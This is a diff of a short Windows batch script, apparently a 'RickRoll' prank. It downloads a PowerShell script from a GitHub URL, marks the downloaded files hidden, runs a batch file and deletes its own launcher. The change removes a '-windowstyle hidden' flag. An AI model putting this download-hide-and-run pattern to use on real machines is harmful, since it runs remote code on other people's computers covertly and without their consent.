@@ -4,7 +4,7 @@ Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkcho
 Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/Mouse.ps1' -OutFile .\Mouse.ps1
 attrib +h Test.bat
 attrib +h mouse.ps1
-powershell start .\Test.bat -windowstyle hidden
+powershell start .\Test.bat 
 cd /D "%~dp0"
 del Big.bat
 exit
